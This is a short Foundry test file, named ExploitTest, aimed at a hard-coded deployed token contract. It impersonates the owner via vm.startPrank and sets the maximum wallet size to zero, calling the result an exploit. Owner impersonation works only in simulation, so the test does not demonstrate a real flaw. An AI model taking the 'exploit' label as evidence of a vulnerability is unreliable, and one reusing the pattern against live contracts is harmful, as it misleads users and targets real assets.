pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGOLDENREGENTINVESTMENT {
    function owner() external view returns (address);
    function setMaxWalletTokens(uint256 _maxToken) external;
    function maxWalletToken() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x134C857757308AEeC4c20CA2A583F560a906ed28;
    address attacker = address(this);
    IGOLDENREGENTINVESTMENT private target;
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IGOLDENREGENTINVESTMENT(payable(TARGET));
        owner = target.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        target.setMaxWalletTokens(0);
        vm.stopPrank();
        assertEq(target.maxWalletToken(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
